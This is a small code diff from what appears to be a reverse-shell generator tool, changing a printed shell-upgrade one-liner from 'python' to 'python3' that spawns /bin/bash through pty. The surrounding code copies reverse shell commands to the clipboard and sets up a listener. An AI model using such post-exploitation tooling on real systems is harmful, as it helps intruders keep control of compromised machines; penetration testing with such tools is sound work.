@@ -154,7 +154,7 @@ def build_command():
         print(info.safe_substitute(text='Reverse shell command copied to clipboard!'))
 
     print(success.safe_substitute(text='In case you want to upgrade your shell, you can use this:\n'))
-    print(code.safe_substitute(code="python -c 'import pty;pty.spawn(\"/bin/bash\")'"))
+    print(code.safe_substitute(code="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"))
 
 
 def setup_listener():
